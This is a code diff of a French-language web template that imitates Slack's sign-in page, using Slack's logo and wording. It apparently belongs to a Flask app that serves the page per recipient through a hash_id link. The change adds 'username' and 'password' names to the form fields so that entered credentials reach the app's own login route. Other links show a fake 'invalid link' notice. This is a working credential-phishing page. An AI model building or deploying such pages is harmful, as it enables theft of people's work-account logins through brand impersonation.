@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -78,25 +76,24 @@
     </style>
 </head>
 <body>
-        {% if hash_id %}
+    {% if hash_id %}
     <div class="container">
         <img src="https://a.slack-edge.com/bv1-13/slack_logo-ebd02d1.svg" alt="Logo Slack" class="logo">
 
-        <h1>Saisissez votre email<br>pour vous connecter</h1>
+        <h1>Saisissez vos identifiants<br>pour vous connecter</h1>
 
         <p class="subtitle">Ou choisissez une autre méthode de connexion.</p>
         <form action="{{ url_for('login', id=hash_id) }}" method="post">
-            <input type="email" class="email-input" placeholder="nom@email-pro.com" required>
-            <input type="password" class="email-input" placeholder="••••••••" required>
-
-        <button class="signin-button" type="submit">Se connecter avec un email</button>
+            <input type="email" name="username" class="email-input" placeholder="nom@email-pro.com" required>
+            <input type="password" name="password" class="email-input" placeholder="••••••••" required>
+            <button class="signin-button" type="submit">Se connecter avec un email</button>
         </form>
-              {% else %}
-        <div class="invalid">
-          <h1>Lien invalide</h1>
-          <p>Ce lien ne semble plus actif. Merci de contacter votre administrateur Slack pour obtenir un nouvel accès.</p>
-        </div>
-      {% endif %}
     </div>
+    {% else %}
+    <div class="invalid">
+        <h1>Lien invalide</h1>
+        <p>Ce lien ne semble plus actif. Merci de contacter votre administrateur Slack pour obtenir un nouvel accès.</p>
+    </div>
+    {% endif %}
 </body>
 </html>
